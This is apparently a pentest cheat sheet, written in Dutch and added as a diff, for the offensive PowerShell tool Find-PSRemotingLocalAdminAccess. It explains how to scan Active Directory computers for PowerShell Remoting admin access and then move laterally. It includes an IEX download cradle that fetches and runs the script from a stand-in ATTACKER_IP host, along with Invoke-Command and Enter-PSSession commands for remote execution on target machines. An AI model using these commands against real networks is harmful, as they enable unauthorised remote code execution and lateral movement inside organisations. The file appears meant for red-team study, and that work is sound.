@@ -1,0 +1,43 @@
+# Find-PSRemotingLocalAdminAccess — Vind machines waar je local admin bent via PS Remoting
+# Scant domein-computers en test of je PSRemoting (WinRM) toegang hebt
+#
+# === Syntax ===
+# . .\Find-PSRemotingLocalAdminAccess.ps1
+# Find-PSRemotingLocalAdminAccess
+#
+# === Belangrijkste opties ===
+# (geen parameters — gebruikt huidige domein-credentials)
+# Standaard: haalt alle computers op uit AD en test PSRemoting toegang
+#
+# === Voorbeelden ===
+
+# Basis gebruik — scan alle domein-computers
+. .\Find-PSRemotingLocalAdminAccess.ps1
+Find-PSRemotingLocalAdminAccess
+
+# Via download cradle
+IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/Find-PSRemotingLocalAdminAccess.ps1')
+Find-PSRemotingLocalAdminAccess
+
+# Na het vinden van toegang — PSRemoting sessie starten
+$s = New-PSSession -ComputerName TARGET
+Enter-PSSession -Session $s
+
+# Commando uitvoeren op remote machine via PSRemoting
+Invoke-Command -ComputerName TARGET -ScriptBlock { whoami; hostname }
+
+# Script uitvoeren op remote machine
+Invoke-Command -ComputerName TARGET -FilePath C:\temp\script.ps1
+
+# Meerdere machines tegelijk
+Invoke-Command -ComputerName TARGET1,TARGET2 -ScriptBlock { whoami }
+
+# Alternatief: handmatig testen met Test-WSMan
+Test-WSMan -ComputerName TARGET
+
+# Alternatief: Find-LocalAdminAccess uit PowerView (via SMB)
+Find-LocalAdminAccess
+
+# Noot: Vereist WinRM poort 5985 (HTTP) of 5986 (HTTPS)
+# Noot: Gebruikt huidige gebruikerscontext (Kerberos ticket)
+# Noot: Kan langzaam zijn bij grote domeinen — filter op OU indien mogelijk
